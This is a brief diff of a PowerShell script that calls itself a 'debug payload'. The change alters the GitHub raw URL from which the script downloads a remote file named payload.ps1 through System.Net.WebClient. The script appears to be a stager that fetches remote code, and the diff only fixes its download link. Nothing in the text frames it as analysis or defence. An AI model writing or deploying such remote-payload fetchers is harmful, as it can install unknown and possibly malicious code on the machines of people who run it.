@@ -15,7 +15,7 @@ try {
     Write-Log "=== MATRIX DEBUG PAYLOAD STARTING ===" "DEBUG"
     
     # Fix: Use stable GitHub raw URL
-    $url = "https://github.com/kkeyal223-hue/a/raw/refs/heads/main/payload.ps1"
+    $url = "https://raw.githubusercontent.com/kkeyal223-hue/a/refs/heads/main/payload.ps1"
     Write-Log "Downloading from: $url" "INFO"
     
     $webClient = New-Object System.Net.WebClient
